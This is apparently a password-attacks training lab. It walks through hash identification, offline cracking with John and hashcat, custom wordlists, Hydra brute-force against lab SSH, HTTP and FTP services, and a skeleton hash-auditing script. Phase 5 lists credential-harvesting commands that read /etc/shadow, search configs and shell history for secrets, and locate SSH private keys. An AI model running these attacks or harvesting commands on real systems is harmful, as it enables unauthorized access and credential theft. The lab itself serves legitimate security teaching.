## 📖 Background

Password attacks fall into two broad categories: **online** attacks (trying credentials against a live service) and **offline** attacks (cracking captured hashes locally). Online attacks are slow and noisy — rate limits and lockouts constrain them. Offline attacks are limited only by your hardware and the hash algorithm's computational cost.

Key concepts:
- **Hash Functions** — One-way functions that produce fixed-length digests (MD5, SHA-256, bcrypt)
- **Salting** — Adding random data to passwords before hashing to prevent rainbow table attacks
- **Wordlist Attacks** — Trying known passwords from a dictionary file
- **Rule-Based Attacks** — Applying transformations (capitalize, append digits) to wordlist entries
- **Brute Force** — Exhaustively trying all character combinations (slow but thorough)
- **Credential Dumping** — Extracting stored credentials from OS, applications, or memory

## 🔬 Lab Instructions

### Phase 1: Hash Identification

1. Examine the following sample hashes and identify their types:
   ```
   5f4dcc3b5aa765d61d8327deb882cf99              (MD5)
   5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8      (SHA-1)
   $1$xyz$A1B2C3D4E5F6G7H8I9J0K1                 (MD5crypt)
   $6$rounds=5000$saltsalt$...                     (SHA-512crypt)
   $2b$12$LJ3m.IKZxREFyFxpKD0bXe...               (bcrypt)
   ```
2. Use hash-identifier to confirm:
   ```bash
   hash-identifier
   # Paste hash when prompted
   ```
3. Check the hashcat hash mode reference:
   ```bash
   hashcat --help | grep -i "md5\|sha1\|bcrypt\|sha512"
   ```
4. Understand why bcrypt and SHA-512crypt are harder to crack than MD5
5. Record the hash type and corresponding hashcat mode for each sample

### Phase 2: Offline Cracking with Wordlists

1. Start with John the Ripper using the default wordlist:
   ```bash
   echo '5f4dcc3b5aa765d61d8327deb882cf99' > hashes.txt
   john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
   john --show --format=raw-md5 hashes.txt
   ```
2. Use hashcat with GPU acceleration (if available):
   ```bash
   hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
   ```
3. Apply rule-based transformations to increase coverage:
   ```bash
   john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt --rules=best64 hashes.txt
   hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
   ```
4. Crack Linux shadow file hashes (SHA-512crypt):
   ```bash
   unshadow /etc/passwd /etc/shadow > unshadowed.txt
   john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
   ```
5. Measure cracking speed across hash types to understand computational cost

### Phase 3: Custom Wordlist Generation

1. Use CeWL to generate a target-specific wordlist from a website:
   ```bash
   cewl http://grimoire-target.lab -d 2 -m 5 -w custom_wordlist.txt
   ```
2. Add common password patterns to the custom list:
   ```bash
   # Append company name variations, years, seasons
   echo -e "Grimoire2024\nGrimoire!\ngrimoire123" >> custom_wordlist.txt
   ```
3. Generate a mangling rules file for common substitutions:
   ```bash
   john --wordlist=custom_wordlist.txt --rules=all --stdout | head -1000 > mangled_wordlist.txt
   ```
4. Combine multiple sources into a deduplicated master list:
   ```bash
   cat custom_wordlist.txt /usr/share/wordlists/rockyou.txt | sort -u > master_wordlist.txt
   ```

### Phase 4: Online Brute-Force with Hydra

1. Brute-force an SSH login with a targeted wordlist:
   ```bash
   hydra -l admin -P custom_wordlist.txt ssh://10.10.10.50 -t 4 -V
   ```
2. Attack an HTTP login form:
   ```bash
   hydra -l admin -P custom_wordlist.txt 10.10.10.50 http-post-form \
     "/login:username=^USER^&password=^PASS^:Invalid credentials" -t 10 -V
   ```
3. Test FTP credentials:
   ```bash
   hydra -L users.txt -P custom_wordlist.txt ftp://10.10.10.50 -t 4
   ```
4. Understand rate limiting and lockout implications — always check the target's policy
5. Record successful credentials and the technique used

### Phase 5: Credential Harvesting on Compromised Systems

1. After gaining access, extract password hashes from the shadow file:
   ```bash
   cat /etc/shadow
   ```
2. Search for passwords in configuration files:
   ```bash
   grep -ri "password\|passwd\|pwd\|secret" /etc/ /opt/ /var/www/ 2>/dev/null
   ```
3. Check for SSH private keys:
   ```bash
   find / -name "id_rsa" -o -name "id_ed25519" 2>/dev/null
   ```
4. Look for credentials in shell history and environment variables:
   ```bash
   cat ~/.bash_history | grep -i "pass\|secret\|key\|token"
   env | grep -i "pass\|secret\|key\|token"
   ```
5. Check for browser saved passwords and application credential stores

```python
#!/usr/bin/env python3
"""GRIMOIRE Password Auditor - LAB-014 Build Your Own"""

import subprocess
import re
import sys

class PasswordAuditor:
    HASH_PATTERNS = {
        r'^[a-f0-9]{32}$': ("MD5", "raw-md5", "0"),
        r'^[a-f0-9]{40}$': ("SHA-1", "raw-sha1", "100"),
        r'^\$1\$': ("MD5crypt", "md5crypt", "500"),
        r'^\$5\$': ("SHA-256crypt", "sha256crypt", "7400"),
        r'^\$6\$': ("SHA-512crypt", "sha512crypt", "1800"),
        r'^\$2[aby]?\$': ("bcrypt", "bcrypt", "3200"),
    }

    def __init__(self, hash_file, wordlist):
        self.hash_file = hash_file
        self.wordlist = wordlist
        self.hashes = []
        self.cracked = {}

    def load_hashes(self):
        """Load and identify hashes from the input file."""
        with open(self.hash_file) as f:
            for line in f:
                h = line.strip()
                if h:
                    htype = self.identify_hash(h)
                    self.hashes.append({"hash": h, "type": htype})
                    print(f"[*] {h[:20]}... → {htype[0]}")

    def identify_hash(self, hash_str):
        """Identify hash type by regex pattern matching."""
        for pattern, info in self.HASH_PATTERNS.items():
            if re.match(pattern, hash_str):
                return info
        return ("Unknown", "raw-md5", "0")

    def crack_hashes(self):
        """Run cracking attacks grouped by hash type."""
        # TODO: Group hashes by type, write temp files, run john/hashcat
        for h in self.hashes:
            print(f"[*] Cracking {h['type'][0]} hashes with wordlist...")

    def check_policy(self, password):
        """Evaluate a cracked password against a security policy."""
        issues = []
        if len(password) < 12:
            issues.append("Too short (< 12 characters)")
        if not re.search(r'[A-Z]', password):
            issues.append("No uppercase letter")
        if not re.search(r'[a-z]', password):
            issues.append("No lowercase letter")
        if not re.search(r'[0-9]', password):
            issues.append("No digit")
        if not re.search(r'[!@#$%^&*(),.?":{}|<>]', password):
            issues.append("No special character")
        return issues if issues else ["PASS"]

    def report(self):
        """Generate an audit report of cracked credentials."""
        print(f"\n{'='*50}")
        print(f"Password Audit Report")
        print(f"Total hashes: {len(self.hashes)}")
        print(f"Cracked: {len(self.cracked)}")
        for h, pw in self.cracked.items():
            policy = self.check_policy(pw)
            status = "FAIL" if policy != ["PASS"] else "PASS"
            print(f"  {h[:20]}... → {pw} [{status}]")
            for issue in policy:
                if issue != "PASS":
                    print(f"    - {issue}")

    def run(self):
        """Full audit pipeline."""
        self.load_hashes()
        self.crack_hashes()
        self.report()

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 password_auditor.py <hash_file> <wordlist>")
        sys.exit(1)
    auditor = PasswordAuditor(sys.argv[1], sys.argv[2])
    auditor.run()
```
